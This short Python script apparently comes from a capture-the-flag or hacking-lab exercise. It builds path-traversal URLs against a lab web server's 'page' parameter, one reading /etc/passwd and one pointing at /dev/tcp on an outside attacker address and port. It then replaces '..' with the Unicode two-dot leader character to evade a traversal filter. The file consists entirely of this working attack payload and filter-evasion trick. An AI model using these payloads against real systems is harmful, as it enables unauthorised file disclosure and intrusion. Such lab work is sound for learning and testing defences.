import unicodedata

url = "http://10.10.11.126/display/?page=../../../../../../../../etc/passwd"
url = "http://10.10.11.126/display/?page=../../../../../../../../dev/tcp/10.10.14.22/8888"


# unicode_back = '(\U+2025)'
unicode_back = "\u2025"
print(unicode_back)

url = url.replace('..', unicode_back)
print(url)
